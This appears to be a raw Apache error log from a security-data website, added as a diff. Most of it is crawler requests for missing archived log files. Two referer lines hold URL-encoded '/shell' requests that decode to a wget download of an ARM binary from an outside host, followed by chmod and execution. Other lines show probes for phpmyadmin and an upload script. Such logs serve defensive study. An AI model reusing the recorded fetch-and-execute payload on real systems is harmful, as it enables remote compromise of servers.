@@ -1,0 +1,144 @@
+[Sat Oct 07 02:47:58 2017] [error] [client 51.255.65.28] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-10-24.gz
+[Sat Oct 07 03:20:12 2017] [error] [client 79.211.79.80] File does not exist: /home/sooshie/secrepo.com/honeypot/"http:
+[Sat Oct 07 03:20:13 2017] [error] [client 79.211.79.80] File does not exist: /home/sooshie/secrepo.com/honeypot/"http:
+[Sat Oct 07 03:20:15 2017] [error] [client 79.211.79.80] File does not exist: /home/sooshie/secrepo.com/honeypot/"http:
+[Sat Oct 07 03:20:16 2017] [error] [client 79.211.79.80] File does not exist: /home/sooshie/secrepo.com/honeypot/"https:
+[Sat Oct 07 03:20:18 2017] [error] [client 79.211.79.80] File does not exist: /home/sooshie/secrepo.com/honeypot/"https:
+[Sat Oct 07 03:27:42 2017] [error] [client 207.46.13.74] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-10-10.gz
+[Sat Oct 07 03:46:19 2017] [error] [client 207.46.13.170] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-11-13.gz
+[Sat Oct 07 03:48:47 2017] [error] [client 207.46.13.74] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-01-17.gz
+[Sat Oct 07 03:53:06 2017] [error] [client 207.46.13.74] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-01-22.gz
+[Sat Oct 07 04:36:53 2017] [error] [client 207.46.13.74] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-03-25.gz
+[Sat Oct 07 04:39:46 2017] [error] [client 207.46.13.170] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-10-08.gz
+[Sat Oct 07 04:41:16 2017] [error] [client 207.46.13.74] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-05-26.gz
+[Sat Oct 07 05:28:38 2017] [error] [client 185.159.156.4] File does not exist: /home/sooshie/secrepo.com/honeypot/Honeypot%20-%20Howto.pdf
+[Sat Oct 07 05:52:46 2017] [error] [client 36.57.178.6] File does not exist: /home/sooshie/secrepo.com/honeypot/bsidesdfw, referer: http://www.secrepo.com/honeypot/bsidesdfw
+[Sat Oct 07 06:23:55 2017] [error] [client 43.239.167.70] File does not exist: /home/sooshie/secrepo.com/phpmyadmin
+[Sat Oct 07 06:54:28 2017] [error] [client 217.182.132.146] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-05-11.gz
+[Sat Oct 07 06:59:23 2017] [error] [client 100.35.47.77] File does not exist: /home/sooshie/secrepo.com/data
+[Sat Oct 07 06:59:24 2017] [error] [client 100.35.47.77] File does not exist: /home/sooshie/secrepo.com/data
+[Sat Oct 07 07:09:49 2017] [error] [client 164.132.161.27] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-11-23.gz
+[Sat Oct 07 07:16:32 2017] [error] [client 51.255.65.16] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-10-17.gz
+[Sat Oct 07 07:18:10 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-07-17.gz
+[Sat Oct 07 07:33:16 2017] [error] [client 51.255.65.93] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-03-02.gz
+[Sat Oct 07 07:34:47 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-03-31.gz
+[Sat Oct 07 07:34:56 2017] [error] [client 164.132.161.31] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-05-02.gz
+[Sat Oct 07 07:39:11 2017] [error] [client 207.46.13.74] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-07-07.gz
+[Sat Oct 07 08:25:49 2017] [error] [client 164.132.161.7] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-11-25.gz
+[Sat Oct 07 08:27:09 2017] [error] [client 207.46.13.170] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-06-03.gz
+[Sat Oct 07 08:35:11 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-10-10.gz
+[Sat Oct 07 08:39:14 2017] [error] [client 207.46.13.74] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-05-22.gz
+[Sat Oct 07 08:47:15 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-11-23.gz
+[Sat Oct 07 08:53:48 2017] [error] [client 164.132.161.43] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-04-20.gz
+[Sat Oct 07 08:57:49 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-11-02.gz
+[Sat Oct 07 09:09:17 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-02-02.gz
+[Sat Oct 07 09:18:49 2017] [error] [client 51.255.71.119] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-04-05.gz
+[Sat Oct 07 09:33:59 2017] [error] [client 51.255.65.44] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-03-20.gz
+[Sat Oct 07 10:06:16 2017] [error] [client 59.153.61.153] File does not exist: /home/sooshie/secrepo.com/phpmyadmin
+[Sat Oct 07 10:15:46 2017] [error] [client 81.37.67.98] File does not exist: /home/sooshie/secrepo.com/apple-touch-icon-precomposed.png
+[Sat Oct 07 10:15:47 2017] [error] [client 81.37.67.98] File does not exist: /home/sooshie/secrepo.com/apple-touch-icon.png
+[Sat Oct 07 10:15:47 2017] [error] [client 81.37.67.98] File does not exist: /home/sooshie/secrepo.com/apple-touch-icon-precomposed.png
+[Sat Oct 07 10:15:47 2017] [error] [client 81.37.67.98] File does not exist: /home/sooshie/secrepo.com/apple-touch-icon.png
+[Sat Oct 07 10:22:21 2017] [error] [client 137.74.207.164] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-05-08.gz
+[Sat Oct 07 10:37:38 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-07-10.gz
+[Sat Oct 07 10:39:15 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-12-12.gz
+[Sat Oct 07 10:39:54 2017] [error] [client 164.132.161.16] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-01-26.gz
+[Sat Oct 07 10:53:46 2017] [error] [client 164.132.161.55] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-09-07.gz
+[Sat Oct 07 11:39:32 2017] [error] [client 217.182.132.177] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-09-16.gz
+[Sat Oct 07 11:41:53 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-05-09.gz
+[Sat Oct 07 11:44:49 2017] [error] [client 207.46.13.170] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-06-19.gz
+[Sat Oct 07 11:54:17 2017] [error] [client 51.255.71.121] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-04-25.gz
+[Sat Oct 07 12:07:20 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/honeypot/bsidesdfw - 2014.ipynb
+[Sat Oct 07 12:19:34 2017] [error] [client 73.232.180.18] File does not exist: /home/sooshie/secrepo.com/data, referer: http://www.secrepo.com/
+[Sat Oct 07 12:21:20 2017] [error] [client 52.80.113.167] File does not exist: /home/sooshie/secrepo.com/shell, referer: http://www.secrepo.com//shell?%77%67%65%74%20%2D%50%20%2F%74%6D%70%20%68%74%74%70%3A%2F%2F%31%31%35%2E%32%33%36%2E%39%32%2E%32%34%32%3A%31%32%34%2F%6C%69%6E%75%78%2D%61%72%6D
+[Sat Oct 07 12:21:21 2017] [error] [client 52.80.113.167] File does not exist: /home/sooshie/secrepo.com/shell, referer: http://www.secrepo.com//shell?%77%67%65%74%20%2D%50%20%2F%74%6D%70%20%68%74%74%70%3A%2F%2F%68%66%73%2E%6D%68%61%63%6B%65%72%2E%63%63%3A%39%32%37%38%2F%6C%69%6E%75%78%2E%61%72%6D%3B%63%68%6D%6F%64%20%37%37%37%20%2F%74%6D%70%2F%6C%69%6E%75%78%2E%61%72%6D%3B%2F%74%6D%70%2F%6C%69%6E%75%78%2E%61%72%6D
+[Sat Oct 07 12:35:49 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-02-28.gz
+[Sat Oct 07 12:36:22 2017] [error] [client 73.232.180.18] File does not exist: /home/sooshie/secrepo.com/data, referer: http://www.secrepo.com/
+[Sat Oct 07 12:42:58 2017] [error] [client 207.46.13.170] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-07-08.gz
+[Sat Oct 07 12:51:57 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-10-14.gz
+[Sat Oct 07 13:10:56 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-01-17.gz
+[Sat Oct 07 13:39:35 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-12-29.gz
+[Sat Oct 07 14:02:23 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-04-05.gz
+[Sat Oct 07 14:11:26 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-02-05.gz
+[Sat Oct 07 14:40:55 2017] [error] [client 207.46.13.170] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-10-18.gz
+[Sat Oct 07 14:45:31 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-02-11.gz
+[Sat Oct 07 15:04:28 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-10-16.gz
+[Sat Oct 07 15:20:40 2017] [error] [client 164.132.162.154] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-01-23.gz
+[Sat Oct 07 15:26:37 2017] [error] [client 164.132.161.16] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-09-10.gz
+[Sat Oct 07 15:29:08 2017] [error] [client 51.255.65.24] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-07-03.gz
+[Sat Oct 07 15:38:25 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-08-07.gz
+[Sat Oct 07 15:39:49 2017] [error] [client 207.46.13.170] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-11-09.gz
+[Sat Oct 07 15:51:56 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/data
+[Sat Oct 07 15:54:06 2017] [error] [client 51.255.65.22] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-08-25.gz
+[Sat Oct 07 16:16:01 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-05-31.gz
+[Sat Oct 07 16:19:51 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-10-18.gz
+[Sat Oct 07 16:21:34 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-04-20.gz
+[Sat Oct 07 16:30:46 2017] [error] [client 51.255.71.113] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-12-10.gz
+[Sat Oct 07 16:48:32 2017] [error] [client 51.255.71.117] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-02-06.gz
+[Sat Oct 07 16:55:57 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-09-19.gz
+[Sat Oct 07 17:00:20 2017] [error] [client 209.90.225.218] File does not exist: /home/sooshie/secrepo.com/modules, referer: http://www.secrepo.com/modules/mod_artuploader/upload.php
+[Sat Oct 07 17:11:05 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-09-01.gz
+[Sat Oct 07 17:11:29 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-07-14.gz
+[Sat Oct 07 17:20:51 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-08-05.gz
+[Sat Oct 07 17:38:27 2017] [error] [client 51.255.65.42] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-01-31.gz
+[Sat Oct 07 17:51:49 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/honeypot/honeypot - howto - bsides austin.pdf
+[Sat Oct 07 17:55:01 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-11-09.gz
+[Sat Oct 07 18:00:28 2017] [error] [client 207.46.13.170] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-03-30.gz
+[Sat Oct 07 18:11:52 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-09-12.gz
+[Sat Oct 07 18:15:49 2017] [error] [client 43.239.167.70] File does not exist: /home/sooshie/secrepo.com/phpmyadmin
+[Sat Oct 07 18:17:50 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-06-23.gz
+[Sat Oct 07 19:01:13 2017] [error] [client 217.182.132.177] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-01-24.gz
+[Sat Oct 07 19:21:23 2017] [error] [client 138.201.59.34] File does not exist: /home/sooshie/secrepo.com/data, referer: http://www.secrepo.com/
+[Sat Oct 07 19:29:12 2017] [error] [client 137.74.207.101] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-10-08.gz
+[Sat Oct 07 19:29:34 2017] [error] [client 207.46.13.170] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-12-20.gz
+[Sat Oct 07 19:29:56 2017] [error] [client 51.255.65.17] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-07-26.gz
+[Sat Oct 07 19:30:02 2017] [error] [client 52.212.146.96] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2017-10-05.gz
+[Sat Oct 07 19:30:03 2017] [error] [client 52.212.146.96] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2017-10-06.gz
+[Sat Oct 07 19:30:03 2017] [error] [client 52.212.146.96] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2017-10-07.gz
+[Sat Oct 07 19:40:03 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-01-17.gz
+[Sat Oct 07 19:47:45 2017] [error] [client 207.46.13.170] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-07-16.gz
+[Sat Oct 07 19:48:01 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-12-09.gz
+[Sat Oct 07 19:48:19 2017] [error] [client 164.132.162.154] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-06-30.gz
+[Sat Oct 07 20:14:15 2017] [error] [client 51.255.65.48] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-12-01.gz
+[Sat Oct 07 20:21:33 2017] [error] [client 157.55.39.224] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-04-04.gz
+[Sat Oct 07 20:25:06 2017] [error] [client 164.132.161.29] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-05-23.gz
+[Sat Oct 07 20:29:56 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-08-10.gz
+[Sat Oct 07 20:31:43 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-02-15.gz
+[Sat Oct 07 20:40:01 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-09-16.gz
+[Sat Oct 07 20:58:04 2017] [error] [client 51.255.65.10] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-12-15.gz
+[Sat Oct 07 21:09:07 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-12-27.gz
+[Sat Oct 07 21:17:59 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-03-10.gz
+[Sat Oct 07 21:23:36 2017] [error] [client 157.55.39.224] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-03-29.gz
+[Sat Oct 07 21:30:33 2017] [error] [client 51.255.65.92] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-06-20.gz
+[Sat Oct 07 21:44:38 2017] [error] [client 164.132.161.69] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-03-16.gz
+[Sat Oct 07 21:51:42 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-01-26.gz
+[Sat Oct 07 22:08:36 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-06-18.gz
+[Sat Oct 07 22:19:06 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-06-19.gz
+[Sat Oct 07 22:25:19 2017] [error] [client 122.179.13.91] File does not exist: /home/sooshie/secrepo.com/apple-touch-icon-precomposed.png
+[Sat Oct 07 22:25:19 2017] [error] [client 122.179.13.91] File does not exist: /home/sooshie/secrepo.com/apple-touch-icon.png
+[Sat Oct 07 22:25:20 2017] [error] [client 122.179.13.91] File does not exist: /home/sooshie/secrepo.com/apple-touch-icon-precomposed.png
+[Sat Oct 07 22:25:20 2017] [error] [client 122.179.13.91] File does not exist: /home/sooshie/secrepo.com/apple-touch-icon.png
+[Sat Oct 07 22:37:27 2017] [error] [client 157.55.39.224] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-02-07.gz
+[Sat Oct 07 22:49:47 2017] [error] [client 217.182.132.154] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-02-12.gz
+[Sat Oct 07 22:50:39 2017] [error] [client 217.182.132.29] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-01-17.gz
+[Sat Oct 07 23:00:11 2017] [error] [client 51.255.71.100] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2016-12-20.gz
+[Sat Oct 07 23:11:27 2017] [error] [client 217.182.132.80] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-10-02.gz
+[Sat Oct 07 23:32:20 2017] [error] [client 115.60.48.68] File does not exist: /home/sooshie/secrepo.com/data, referer: http://www.secrepo.com/
+[Sat Oct 07 23:37:06 2017] [error] [client 101.226.65.105] File does not exist: /home/sooshie/secrepo.com/data, referer: 48C38094A383EFE5D2115.60.48.68
+[Sat Oct 07 23:43:30 2017] [error] [client 219.74.50.243] File does not exist: /home/sooshie/secrepo.com/bootstrap/img/apple-touch-icon-114x114.png
+[Sat Oct 07 23:48:38 2017] [error] [client 157.55.39.207] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-07-12.gz
+[Sat Oct 07 23:57:11 2017] [error] [client 164.132.161.65] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-12-11.gz
+[Sun Oct 08 00:07:07 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-02-08.gz
+[Sun Oct 08 00:25:51 2017] [error] [client 51.255.65.69] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-09-04.gz
+[Sun Oct 08 00:37:22 2017] [error] [client 164.132.161.5] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-05-07.gz
+[Sun Oct 08 00:50:04 2017] [error] [client 164.132.161.10] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-09-17.gz
+[Sun Oct 08 01:08:50 2017] [error] [client 51.255.65.41] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-06-12.gz
+[Sun Oct 08 01:19:41 2017] [error] [client 114.91.112.11] File does not exist: /home/sooshie/secrepo.com/data, referer: http://www.secrepo.com/
+[Sun Oct 08 01:19:49 2017] [error] [client 114.91.112.11] File does not exist: /home/sooshie/secrepo.com/data, referer: http://www.secrepo.com/
+[Sun Oct 08 01:32:11 2017] [error] [client 51.255.65.8] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-10-31.gz
+[Sun Oct 08 01:39:45 2017] [error] [client 157.55.39.224] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-06-04.gz
+[Sun Oct 08 01:46:33 2017] [error] [client 157.55.39.157] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2016-04-12.gz
+[Sun Oct 08 02:02:27 2017] [error] [client 217.182.132.152] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-08-17.gz
+[Sun Oct 08 02:05:58 2017] [error] [client 157.55.39.152] File does not exist: /home/sooshie/secrepo.com/self.logs/access.log.2015-07-28.gz
+[Sun Oct 08 02:10:58 2017] [error] [client 157.55.39.224] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-09-10.gz
+[Sun Oct 08 02:13:26 2017] [error] [client 157.55.39.224] File does not exist: /home/sooshie/secrepo.com/self.logs/error.log.2015-09-22.gz
